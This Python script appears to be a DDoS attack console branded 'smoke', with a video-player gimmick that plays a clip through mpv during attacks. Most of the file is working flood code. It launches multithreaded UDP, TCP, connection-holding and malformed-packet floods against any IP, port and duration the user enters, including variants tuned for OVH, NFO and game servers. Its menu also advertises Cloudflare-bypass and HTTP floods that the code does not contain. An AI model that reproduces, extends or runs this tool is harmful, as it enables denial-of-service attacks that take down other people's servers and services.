#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
STANDALONE ATTACK + VIDEO PLAYER - USING YOUR WORKING MPV COMMAND
Run: python stand.py
"""

import socket
import threading
import time
import sys
import random
import os
import subprocess
import ipaddress
from datetime import datetime

# ============ COLORS ============
class Colors:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    RESET = '\033[0m'
    LIGHTBLACK = '\033[90m'

# ============ BANNER ============
BANNER = f"""{Colors.RED}
\033[97mUptime: \033[94m97% \033[97m| Channel: \033[94m@smokec2 \033[97m| Servers: \033[94m29
     
_._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'"-

\033[97mWrite \033[91;1mhelp \033[97mto see command
"""

HELP = f"""

{Colors.BRIGHT_WHITE}HELP         {Colors.RED}: {Colors.WHITE}Shows list of commands{Colors.RED}.   
{Colors.BRIGHT_WHITE}METHODS      {Colors.RED}: {Colors.WHITE}Shows list of methods{Colors.RED}.     
{Colors.BRIGHT_WHITE}CLEAR        {Colors.RED}: {Colors.WHITE}Clears the screen{Colors.RED}.          
{Colors.BRIGHT_WHITE}EXIT         {Colors.RED}: {Colors.WHITE}Exits the program{Colors.RED}.

"""

METHODS = f"""
{Colors.WHITE}Layer 4{Colors.RED}:
{Colors.RED}- {Colors.WHITE}!udp{Colors.RED}: {Colors.WHITE}UDP flood{Colors.RED}.   
{Colors.RED}- {Colors.WHITE}!tcp{Colors.RED}: {Colors.WHITE}TCP flood{Colors.RED}.    
{Colors.RED}- {Colors.WHITE}!ovh{Colors.RED}: {Colors.WHITE}UDP/TCP flood optimized for OVH{Colors.RED}.  
{Colors.RED}- {Colors.WHITE}!game{Colors.RED}: {Colors.WHITE}UDP flood optimized for game servers{Colors.RED}.  
{Colors.RED}- {Colors.WHITE}!nfo{Colors.RED}: {Colors.WHITE}TCP flood optimized for NFO{Colors.RED}. 
{Colors.RED}- {Colors.WHITE}!udpbypass{Colors.RED}: {Colors.WHITE}UDP flood bypass{Colors.RED}.
{Colors.RED}- {Colors.WHITE}!hold{Colors.RED}: {Colors.WHITE}Hold attack{Colors.RED}.  
{Colors.RED}- {Colors.WHITE}!crash{Colors.RED}: {Colors.WHITE}Crash attack{Colors.RED}.  
{Colors.WHITE}Layer 7{Colors.RED}:
{Colors.RED}- {Colors.WHITE}!tls{Colors.RED}: {Colors.WHITE}HTTP1.2 flood{Colors.RED}.
{Colors.RED}- {Colors.WHITE}!tlsv2{Colors.RED}: {Colors.WHITE}HTTP2 flood{Colors.RED}.  
{Colors.RED}- {Colors.WHITE}!bypass{Colors.RED}: {Colors.WHITE}HTTP bypass flood{Colors.RED}.  
{Colors.RED}- {Colors.WHITE}!browser{Colors.RED}: {Colors.WHITE}Browser method for bypassing Cloudflare{Colors.RED}.
{Colors.RED}- {Colors.WHITE}!mix{Colors.RED}: {Colors.WHITE}Mixed HTTP attacks{Colors.RED}.
{Colors.RED}- {Colors.WHITE}!cf{Colors.RED}: {Colors.WHITE}Cloudflare bypass{Colors.RED}.
"""

# ============ VIDEO PLAYER ============
class VideoAttackPlayer:
    def __init__(self, video_path="/sdcard/Download/edit.mp4"):
        self.video_path = video_path
        self.mpv_process = None
        self.attack_running = False
        self.stats = {'packets': 0, 'connections': 0, 'errors': 0, 'start_time': 0}
        self.attack_thread = None
        self.video_playing = False
        
    def play_with_attack(self, attack_func, *args, **kwargs):
        """Play video while running attack in background"""
        if not os.path.exists(self.video_path):
            print(f"\n{Colors.RED}[!] Video not found: {self.video_path}{Colors.RESET}")
            print(f"{Colors.YELLOW}[+] Running attack without video...{Colors.RESET}")
            attack_func(*args, **kwargs)
            return
        
        print(f"\n{Colors.GREEN}[+] Playing video during attack...{Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Video: {os.path.basename(self.video_path)}{Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Press Ctrl+C to stop both{Colors.RESET}\n")
        
        # Reset stats
        self.stats = {'packets': 0, 'connections': 0, 'errors': 0, 'start_time': time.time()}
        self.attack_running = True
        self.video_playing = True
        
        # Start attack in thread
        def attack_thread_func():
            try:
                attack_func(*args, **kwargs)
            except Exception as e:
                print(f"{Colors.RED}[!] Attack error: {e}{Colors.RESET}")
            self.attack_running = False
        
        self.attack_thread = threading.Thread(target=attack_thread_func, daemon=True)
        self.attack_thread.start()
        
        # Wait a moment for attack to start
        time.sleep(1)
        
        # Play video with YOUR EXACT WORKING COMMAND
        try:
            # Clear screen for video
            os.system('clear' if os.name == 'posix' else 'cls')
            
            # YOUR EXACT MPV COMMAND - this works for you
            cmd = [
                'mpv',
                '--vo=tct',
                '--geometry=300x120',
                '--osd-level=0',
                '--no-osd-bar',
                '--no-terminal',
                '--really-quiet',
                self.video_path
            ]
            
            print(f"{Colors.CYAN}[+] Playing video...{Colors.RESET}")
            
            # Run mpv - this BLOCKS until video ends
            self.mpv_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            
            # Wait for video to finish (THIS BLOCKS)
            self.mpv_process.wait()
            
            print(f"{Colors.GREEN}[+] Video finished{Colors.RESET}")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Stopped by user{Colors.RESET}")
        except Exception as e:
            print(f"\n{Colors.RED}[!] Video error: {e}{Colors.RESET}")
        finally:
            self.video_playing = False
            self.attack_running = False
            
            # Kill mpv if still running
            if self.mpv_process and self.mpv_process.poll() is None:
                self.mpv_process.terminate()
                time.sleep(0.5)
                if self.mpv_process.poll() is None:
                    self.mpv_process.kill()
            
            # Wait for attack to finish
            if self.attack_thread:
                self.attack_thread.join(timeout=3)
            
            # Show stats
            self.show_stats()
    
    def show_stats(self):
        """Display attack statistics"""
        duration = time.time() - self.stats.get('start_time', time.time())
        
        print(f"\n{Colors.GREEN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{Colors.GREEN}║{Colors.BRIGHT_WHITE}              ATTACK COMPLETE                             {Colors.GREEN}║")
        print(f"{Colors.GREEN}╚══════════════════════════════════════════════════════════════╝{Colors.RESET}")
        print(f"{Colors.YELLOW}┌────────────────────────────────────────────────────────────────┐")
        print(f"{Colors.YELLOW}│{Colors.WHITE} Packets Sent:   {Colors.CYAN}{self.stats.get('packets', 0):,}")
        print(f"{Colors.YELLOW}│{Colors.WHITE} Connections:     {Colors.CYAN}{self.stats.get('connections', 0):,}")
        print(f"{Colors.YELLOW}│{Colors.WHITE} Errors:          {Colors.CYAN}{self.stats.get('errors', 0):,}")
        print(f"{Colors.YELLOW}│{Colors.WHITE} Duration:        {Colors.CYAN}{duration:.2f}s")
        if self.stats.get('packets', 0) > 0 and duration > 0:
            rate = self.stats['packets'] / duration
            print(f"{Colors.YELLOW}│{Colors.WHITE} Packets/sec:     {Colors.CYAN}{rate:.2f}")
        print(f"{Colors.YELLOW}└────────────────────────────────────────────────────────────────┘{Colors.RESET}")

# ============ ATTACK FUNCTIONS ============

def udp_attack(target, port, duration, threads=300):
    """UDP flood attack"""
    print(f"{Colors.CYAN}[*] Starting UDP flood on {target}:{port} for {duration}s{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Using {threads} threads{Colors.RESET}")
    
    player = video_player
    player.stats = {'packets': 0, 'connections': 0, 'errors': 0, 'start_time': time.time()}
    
    def udp_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 10*1024*1024)
        sock.settimeout(0.1)
        
        while player.attack_running:
            try:
                payload = os.urandom(random.randint(64, 1400))
                sock.sendto(payload, (target, port))
                player.stats['packets'] += 1
                time.sleep(0.00001)
            except:
                player.stats['errors'] += 1
        sock.close()
    
    # Start workers
    workers = []
    thread_count = min(threads, 500)
    for i in range(thread_count):
        t = threading.Thread(target=udp_worker, daemon=True)
        t.start()
        workers.append(t)
    
    # Wait for duration or until stopped
    start = time.time()
    while player.attack_running and time.time() - start < duration:
        time.sleep(0.5)
    
    player.attack_running = False
    
    for t in workers:
        t.join(timeout=0.5)
    
    print(f"{Colors.GREEN}[+] Attack completed! Packets: {player.stats['packets']}{Colors.RESET}")

def tcp_attack(target, port, duration, threads=200):
    """TCP flood attack"""
    print(f"{Colors.CYAN}[*] Starting TCP flood on {target}:{port} for {duration}s{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Using {threads} threads{Colors.RESET}")
    
    player = video_player
    player.stats = {'packets': 0, 'connections': 0, 'errors': 0, 'start_time': time.time()}
    
    def tcp_worker():
        while player.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target, port))
                sock.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                sock.close()
                player.stats['connections'] += 1
                time.sleep(0.0005)
            except:
                player.stats['errors'] += 1
    
    workers = []
    thread_count = min(threads, 300)
    for i in range(thread_count):
        t = threading.Thread(target=tcp_worker, daemon=True)
        t.start()
        workers.append(t)
    
    start = time.time()
    while player.attack_running and time.time() - start < duration:
        time.sleep(0.5)
    
    player.attack_running = False
    
    for t in workers:
        t.join(timeout=0.5)
    
    print(f"{Colors.GREEN}[+] Attack completed! Connections: {player.stats['connections']}{Colors.RESET}")

def ovh_attack(target, port, duration, threads=200):
    """OVH optimized attack"""
    print(f"{Colors.CYAN}[*] Starting OVH attack on {target}:{port} for {duration}s{Colors.RESET}")
    
    player = video_player
    player.stats = {'packets': 0, 'connections': 0, 'errors': 0, 'start_time': time.time()}
    
    def ovh_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 10*1024*1024)
        
        ports = [port, 443, 8080, 8443, 53, 21, 22, 25]
        
        while player.attack_running:
            try:
                payload = os.urandom(1024)
                for p in ports:
                    sock.sendto(payload, (target, p))
                    player.stats['packets'] += 1
                time.sleep(0.0005)
            except:
                player.stats['errors'] += 1
        sock.close()
    
    workers = []
    for i in range(min(threads, 300)):
        t = threading.Thread(target=ovh_worker, daemon=True)
        t.start()
        workers.append(t)
    
    start = time.time()
    while player.attack_running and time.time() - start < duration:
        time.sleep(0.5)
    
    player.attack_running = False
    
    for t in workers:
        t.join(timeout=0.5)
    
    print(f"{Colors.GREEN}[+] Attack completed! Packets: {player.stats['packets']}{Colors.RESET}")

def game_attack(target, port, duration, threads=500):
    """Game server optimized attack"""
    print(f"{Colors.CYAN}[*] Starting GAME attack on {target}:{port} for {duration}s{Colors.RESET}")
    
    player = video_player
    player.stats = {'packets': 0, 'connections': 0, 'errors': 0, 'start_time': time.time()}
    
    def game_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 10*1024*1024)
        
        while player.attack_running:
            try:
                payload = os.urandom(random.randint(64, 512))
                sock.sendto(payload, (target, port))
                player.stats['packets'] += 1
                time.sleep(0.00001)
            except:
                player.stats['errors'] += 1
        sock.close()
    
    workers = []
    for i in range(min(threads, 800)):
        t = threading.Thread(target=game_worker, daemon=True)
        t.start()
        workers.append(t)
    
    start = time.time()
    while player.attack_running and time.time() - start < duration:
        time.sleep(0.5)
    
    player.attack_running = False
    
    for t in workers:
        t.join(timeout=0.5)
    
    print(f"{Colors.GREEN}[+] Attack completed! Packets: {player.stats['packets']}{Colors.RESET}")

def nfo_attack(target, port, duration, threads=300):
    """NFO optimized attack"""
    print(f"{Colors.CYAN}[*] Starting NFO attack on {target}:{port} for {duration}s{Colors.RESET}")
    
    player = video_player
    player.stats = {'packets': 0, 'connections': 0, 'errors': 0, 'start_time': time.time()}
    
    def nfo_worker():
        while player.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.05)
                sock.connect((target, port))
                sock.send(b'\x00' * 1024)
                sock.close()
                player.stats['connections'] += 1
                time.sleep(0.0005)
            except:
                player.stats['errors'] += 1
    
    workers = []
    for i in range(min(threads, 500)):
        t = threading.Thread(target=nfo_worker, daemon=True)
        t.start()
        workers.append(t)
    
    start = time.time()
    while player.attack_running and time.time() - start < duration:
        time.sleep(0.5)
    
    player.attack_running = False
    
    for t in workers:
        t.join(timeout=0.5)
    
    print(f"{Colors.GREEN}[+] Attack completed! Connections: {player.stats['connections']}{Colors.RESET}")

def udpbypass_attack(target, port, duration, threads=200):
    """UDP bypass attack"""
    print(f"{Colors.CYAN}[*] Starting UDPBYPASS attack on {target}:{port} for {duration}s{Colors.RESET}")
    
    player = video_player
    player.stats = {'packets': 0, 'connections': 0, 'errors': 0, 'start_time': time.time()}
    
    def udpbypass_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 10*1024*1024)
        
        ports = [port, 443, 8080, 8443, 53, 21, 22, 25, 3306, 3389]
        
        while player.attack_running:
            try:
                payload = os.urandom(random.randint(64, 1400))
                for p in random.sample(ports, 3):
                    sock.sendto(payload, (target, p))
                    player.stats['packets'] += 1
                time.sleep(0.0005)
            except:
                player.stats['errors'] += 1
        sock.close()
    
    workers = []
    for i in range(min(threads, 300)):
        t = threading.Thread(target=udpbypass_worker, daemon=True)
        t.start()
        workers.append(t)
    
    start = time.time()
    while player.attack_running and time.time() - start < duration:
        time.sleep(0.5)
    
    player.attack_running = False
    
    for t in workers:
        t.join(timeout=0.5)
    
    print(f"{Colors.GREEN}[+] Attack completed! Packets: {player.stats['packets']}{Colors.RESET}")

def hold_attack(target, port, duration, threads=100):
    """Hold attack - keeps connections open"""
    print(f"{Colors.CYAN}[*] Starting HOLD attack on {target}:{port} for {duration}s{Colors.RESET}")
    
    player = video_player
    player.stats = {'packets': 0, 'connections': 0, 'errors': 0, 'start_time': time.time()}
    
    connections = []
    
    def hold_worker():
        while player.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target, port))
                sock.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                connections.append(sock)
                player.stats['connections'] += 1
                time.sleep(0.01)
            except:
                player.stats['errors'] += 1
    
    workers = []
    for i in range(min(threads, 200)):
        t = threading.Thread(target=hold_worker, daemon=True)
        t.start()
        workers.append(t)
    
    start = time.time()
    while player.attack_running and time.time() - start < duration:
        time.sleep(0.5)
    
    player.attack_running = False
    
    # Close all connections
    for sock in connections:
        try:
            sock.close()
        except:
            pass
    
    for t in workers:
        t.join(timeout=0.5)
    
    print(f"{Colors.GREEN}[+] Attack completed! Connections: {player.stats['connections']}{Colors.RESET}")

def crash_attack(target, port, duration, threads=300):
    """Crash attack - sends malformed packets"""
    print(f"{Colors.CYAN}[*] Starting CRASH attack on {target}:{port} for {duration}s{Colors.RESET}")
    
    player = video_player
    player.stats = {'packets': 0, 'connections': 0, 'errors': 0, 'start_time': time.time()}
    
    def crash_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 10*1024*1024)
        
        malformed = [
            b'\x00' * 1024,
            b'\xff' * 1024,
            b'\x01' * 512 + b'\x00' * 512,
            os.urandom(1024),
            b'GET /' + b'\x00' * 100 + b' HTTP/1.1\r\n\r\n'
        ]
        
        while player.attack_running:
            try:
                payload = random.choice(malformed)
                sock.sendto(payload, (target, port))
                player.stats['packets'] += 1
                time.sleep(0.0001)
            except:
                player.stats['errors'] += 1
        sock.close()
    
    workers = []
    for i in range(min(threads, 500)):
        t = threading.Thread(target=crash_worker, daemon=True)
        t.start()
        workers.append(t)
    
    start = time.time()
    while player.attack_running and time.time() - start < duration:
        time.sleep(0.5)
    
    player.attack_running = False
    
    for t in workers:
        t.join(timeout=0.5)
    
    print(f"{Colors.GREEN}[+] Attack completed! Packets: {player.stats['packets']}{Colors.RESET}")

# ============ VALIDATION FUNCTIONS ============

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except:
        return False

def validate_port(port):
    try:
        p = int(port)
        return 1 <= p <= 65535
    except:
        return False

def validate_time(time_str):
    try:
        t = int(time_str)
        return 10 <= t <= 86400
    except:
        return False

# ============ COMMAND LINE ============

ansi_clear = '\033[2J\033[H'
video_player = None

def send_output(data, escape=True, reset=True):
    output = data
    if reset:
        output += Colors.RESET
    if escape:
        output += '\r\n'
    sys.stdout.write(output)
    sys.stdout.flush()
    return True

def command_line():
    """Main command line interface"""
    send_output(BANNER)
    
    prompt = f'\x1b[37;47m\x1b[97msmoke\x1b[91;1m ✦ \x1b[97mstandalone\x1b[0m\x1b[91m ➤ {Colors.BRIGHT_YELLOW}'
    send_output(prompt, False)

    while True:
        try:
            data = input()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()

            if command == 'HELP':
                send_output(HELP)
            elif command == 'METHODS':
                send_output(METHODS)
            elif command == 'CLEAR' or command == 'CLS':
                send_output(ansi_clear, False)
                send_output(BANNER)
            elif command == 'EXIT' or command == 'LOGOUT':
                send_output(f'{Colors.GREEN}[+] Exiting...{Colors.RESET}')
                break
            elif command == 'SERVERS':
                send_output(f'{Colors.BRIGHT_WHITE}Available servers: 36.{Colors.RESET}')
            elif command == '!UDP':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send_output(f'{Colors.GREEN}[+] Starting UDP attack with video...{Colors.RESET}')
                        video_player.play_with_attack(udp_attack, target, port, duration)
                    else:
                        send_output(f'{Colors.RED}[!] Invalid parameters{Colors.RESET}')
                else:
                    send_output(f'{Colors.RED}[!] Usage: !udp <IP> <PORT> <TIME>{Colors.RESET}')
            elif command == '!TCP':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send_output(f'{Colors.GREEN}[+] Starting TCP attack with video...{Colors.RESET}')
                        video_player.play_with_attack(tcp_attack, target, port, duration)
                    else:
                        send_output(f'{Colors.RED}[!] Invalid parameters{Colors.RESET}')
                else:
                    send_output(f'{Colors.RED}[!] Usage: !tcp <IP> <PORT> <TIME>{Colors.RESET}')
            elif command == '!OVH':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send_output(f'{Colors.GREEN}[+] Starting OVH attack with video...{Colors.RESET}')
                        video_player.play_with_attack(ovh_attack, target, port, duration)
                    else:
                        send_output(f'{Colors.RED}[!] Invalid parameters{Colors.RESET}')
                else:
                    send_output(f'{Colors.RED}[!] Usage: !ovh <IP> <PORT> <TIME>{Colors.RESET}')
            elif command == '!GAME':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send_output(f'{Colors.GREEN}[+] Starting GAME attack with video...{Colors.RESET}')
                        video_player.play_with_attack(game_attack, target, port, duration)
                    else:
                        send_output(f'{Colors.RED}[!] Invalid parameters{Colors.RESET}')
                else:
                    send_output(f'{Colors.RED}[!] Usage: !game <IP> <PORT> <TIME>{Colors.RESET}')
            elif command == '!NFO':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send_output(f'{Colors.GREEN}[+] Starting NFO attack with video...{Colors.RESET}')
                        video_player.play_with_attack(nfo_attack, target, port, duration)
                    else:
                        send_output(f'{Colors.RED}[!] Invalid parameters{Colors.RESET}')
                else:
                    send_output(f'{Colors.RED}[!] Usage: !nfo <IP> <PORT> <TIME>{Colors.RESET}')
            elif command == '!UDPBYPASS':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send_output(f'{Colors.GREEN}[+] Starting UDPBYPASS attack with video...{Colors.RESET}')
                        video_player.play_with_attack(udpbypass_attack, target, port, duration)
                    else:
                        send_output(f'{Colors.RED}[!] Invalid parameters{Colors.RESET}')
                else:
                    send_output(f'{Colors.RED}[!] Usage: !udpbypass <IP> <PORT> <TIME>{Colors.RESET}')
            elif command == '!HOLD':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send_output(f'{Colors.GREEN}[+] Starting HOLD attack with video...{Colors.RESET}')
                        video_player.play_with_attack(hold_attack, target, port, duration)
                    else:
                        send_output(f'{Colors.RED}[!] Invalid parameters{Colors.RESET}')
                else:
                    send_output(f'{Colors.RED}[!] Usage: !hold <IP> <PORT> <TIME>{Colors.RESET}')
            elif command == '!CRASH':
                if len(args) >= 4:
                    target = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    if validate_ip(target) and validate_port(str(port)) and validate_time(str(duration)):
                        send_output(f'{Colors.GREEN}[+] Starting CRASH attack with video...{Colors.RESET}')
                        video_player.play_with_attack(crash_attack, target, port, duration)
                    else:
                        send_output(f'{Colors.RED}[!] Invalid parameters{Colors.RESET}')
                else:
                    send_output(f'{Colors.RED}[!] Usage: !crash <IP> <PORT> <TIME>{Colors.RESET}')
            else:
                send_output(f'{Colors.RED}[!] Unknown command: {command}{Colors.RESET}')
            
            send_output(prompt, False)
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Exiting...{Colors.RESET}")
            break
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
            send_output(prompt, False)

def main():
    """Main entry point"""
    global video_player
    video_player = VideoAttackPlayer("/sdcard/Download/edit.mp4")
    
    print(f"\n{Colors.GREEN}╔══════════════════════════════════════════════════════════════╗")
    print(f"{Colors.GREEN}║{Colors.BRIGHT_WHITE}         STANDALONE ATTACK + VIDEO PLAYER                  {Colors.GREEN}║")
    print(f"{Colors.GREEN}╚══════════════════════════════════════════════════════════════╝{Colors.RESET}")
    print(f"{Colors.YELLOW}Video path: {video_player.video_path}{Colors.RESET}")
    print(f"{Colors.YELLOW}Commands: !udp, !tcp, !ovh, !game, !nfo, !udpbypass, !hold, !crash{Colors.RESET}")
    print(f"{Colors.YELLOW}Type 'help' for commands, 'exit' to quit{Colors.RESET}\n")
    
    try:
        command_line()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Exiting...{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Fatal error: {e}{Colors.RESET}")

if __name__ == "__main__":
    main()
